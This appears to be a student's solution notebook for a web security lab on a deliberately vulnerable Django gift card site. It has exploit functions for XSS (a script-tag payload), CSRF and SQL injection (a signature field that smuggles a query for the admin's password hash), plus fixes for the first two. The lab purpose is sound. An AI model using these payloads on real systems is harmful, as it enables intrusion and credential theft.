# %%

import os
import sys
import django
import io
import unittest
import json
import re
import contextlib
import time
import shutil
import stat
import inspect

# Setup Django environment
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "GiftcardSite.settings")
django.setup()

from django.test import TestCase, Client
from django.db import connection
from LegacySite.models import Card, User
from django.template import engines

from django.test import TransactionTestCase
from django.core.management import call_command


# %%


def exploit_xss_vulnerability():
    """
    Exploit XSS vulnerability by injecting malicious script into director parameter.

    Args:
        None

    Returns:
        bool: True if XSS payload was successfully injected, False otherwise
    """
    from django.conf import settings

    # Add testserver to ALLOWED_HOSTS if not already there
    if "testserver" not in settings.ALLOWED_HOSTS:
        settings.ALLOWED_HOSTS.append("testserver")

    client = Client()
    if "SOLUTION":
        xss_payload = '<script>alert("XSS Attack!")</script>'

        # Test the vulnerable endpoint
        response = client.get(f"/buy/6?director={xss_payload}")
    else:
        # TODO: Create XSS payload and test vulnerable endpoint
        # - Create a malicious JavaScript payload
        # - Replace the current response endpoint with the vulnerable one
        response = client.get("/buy/1")

    print(f"XSS exploit response status: {response.status_code}")

    if response.status_code == 200:
        response_content = response.content.decode()
        if xss_payload in response_content:
            print("[+] XSS vulnerability successfully exploited!")
            print(f"[+] Malicious payload found in response: {xss_payload}")
            return True
        else:
            print("[-] XSS payload not found in response (may be escaped)")
            return False
    else:
        print(f"[-] Request failed with status {response.status_code}")
        return False


# from w2d4_test import test_exploit_xss_vulnerability

# if __name__ == "__main__":
#     test_exploit_xss_vulnerability(exploit_xss_vulnerability)
# %%
# %%
result = {
    "merchant_id": "GPT-4 API Credits",
    "customer_id": "test@test.com",
    "total_value": "1",
    "records": [
        {"record_type": "amount_change", "amount_added": 2000, "signature": "74891960f9ab25d407967c106ddf4093"}
    ],
}

# %%
# url = "http://127.0.0.1:8000/gift/1"
# headers = {
# "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0",
# "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
# "Accept-Language": "en-US,en;q=0.5",
# "Accept-Encoding": "gzip, deflate, br, zstd",
# "Referer": "http://127.0.0.1:8000/gift/1",
# "Content-Type": "application/x-www-form-urlencoded",
# "Origin": "http://127.0.0.1:8000",
# "Connection": "keep-alive",
# "Cookie": "sessionid=zg8hd07t17ujbx4vqzdv4wzr8ci9rbvr",
# "Upgrade-Insecure-Requests": "1",
# "Sec-Fetch-Dest": "document",
# "Sec-Fetch-Mode": "navigate",
# "Sec-Fetch-Site": "same-origin",
# "Sec-Fetch-User": "?1",
# "DNT": "1",
# "Sec-GPC": "1",
# "Priority": "u=0, i",
# }
# data_raw = "amount=1^&username=test%40test.com^&xss_payload=helloworld"
# res = requests.post(url, data=data_raw, headers=headers)
# res.content

# %%
import os
import glob


def fix_xss_vulnerability():
    """
    Fix XSS vulnerability by finding discepencies.
    You can do it manually or edit the front end code.

    Args:
        None

    Returns:
        None
    """
    # TODO: Look for |safe filter in templates
    # - What does `|` mean in this case
    # - You can do it manually or use re.search within the code
    filenames = glob.glob("templates/**/*.html", recursive=True)

    for file in filenames:
        with open(file, "r") as f:
            x = f.read()
            x = x.replace("|safe", "")

        with open(file, "w") as f:
            f.write(x)


from w2d4_test import test_fix_xss_vulnerability

print("\nTesting XSS vulnerability fix...")
# test_fix_xss_vulnerability(fix_xss_vulnerability)
# %%

# existing html
#


# sessionid:"zg8hd07t17ujbx4vqzdv4wzr8ci9rbvr"


def exploit_csrf_vulnerability():
    """
    Create malicious HTML that exploits CSRF vulnerability.

    Args:
        None

    Returns:
        str: HTML content that performs the CSRF attack
    """
    # TODO: Create malicious HTML that performs CSRF attack
    # - Create an HTML page that appears legitimate
    # - Include a hidden form targeting the gift card endpoint
    # - Add JavaScript to automatically submit the form
    # - Give user "test2" a gify card
    with open("/workspaces/aisb/w2d4/data/csrf.html", "r") as f:
        x = f.read()
    return x


from w2d4_test import test_exploit_csrf_vulnerability


print("\nTesting CSRF vulnerability exploitation...")
# test_exploit_csrf_vulnerability(exploit_csrf_vulnerability)
# %%

def fix_csrf_vulnerability():
    """
    Fix CSRF vulnerability by implementing comprehensive CSRF protection.
    You can do it manually or edit the back end code.
    
    Args:
        None
        
    Returns:
        None
    """
    import os
    # TODO: Implement CSRF protection with tokens, middleware, and security settings
    # - Add CSRF tokens to all necessary POST forms in templates
    # - Enable CSRF middleware
    # - Add possible decorators to vulnerable views
    # - Configure secure cookie settings
    os.chdir('w2d4')

    with open('GiftcardSite/settings.py', 'r') as f:
        x = f.read()
        x = x.replace('Lax', 'Strict')
        x = x.replace('MIDDLEWARE = [', 'MIDDLEWARE = [\n"django.middleware.csrf.CsrfViewMiddleware",')

    with open('GiftcardSite/settings.py', 'w') as f:
        f.write(x)
        f.write('\nSESSION_COOKIE_SECURE = True')
        f.write('\nCSRF_COOKIE_SECURE = True')

    filenames = glob.glob("templates/**/*.html", recursive=True)

    for file in filenames:
        with open(file, 'r') as f:
            x = f.read()
            x = re.sub(r'(<form[^>]*>)', '\\1{% csrf_token %}', x)

        with open(file, 'w') as f:
            f.write(x)

    with open('LegacySite/views.py', 'r') as f:
        x = f.read()
        x = x.replace('\ndef ', '\n@csrf_protect\ndef ')

    with open('LegacySite/views.py', 'w') as f:
        f.write(x)

# from w2d4_test import test_fix_csrf_vulnerability
# print("\nTesting CSRF vulnerability fix...")
# test_fix_csrf_vulnerability(fix_csrf_vulnerability)

# %%

def exploit_sql_injection_vulnerability():
    """
    Create SQL injection payload for card signature processing.

    Args:
        None

    Returns:
        bytes: JSON-encoded card data with malicious SQL injection payload to reveal admin password hash
    """
    new_card = {
        "merchant_id": "GPT-4 API Credits",
        "customer_id": "test@test.com",
        "total_value": "1",
        "records": [
            {
                "record_type": "amount_change",
                "amount_added": 2000,
                "signature": "74891960f9ab25d407967c106ddf4093'); SELECT * FROM LegacySite_user WHERE username = 'admin'; --",
            }
        ],
    }
    res = json.dumps(new_card, indent=2).encode('utf-8')
    return res


from w2d4_test import test_exploit_sql_injection_vulnerability


test_exploit_sql_injection_vulnerability(exploit_sql_injection_vulnerability)
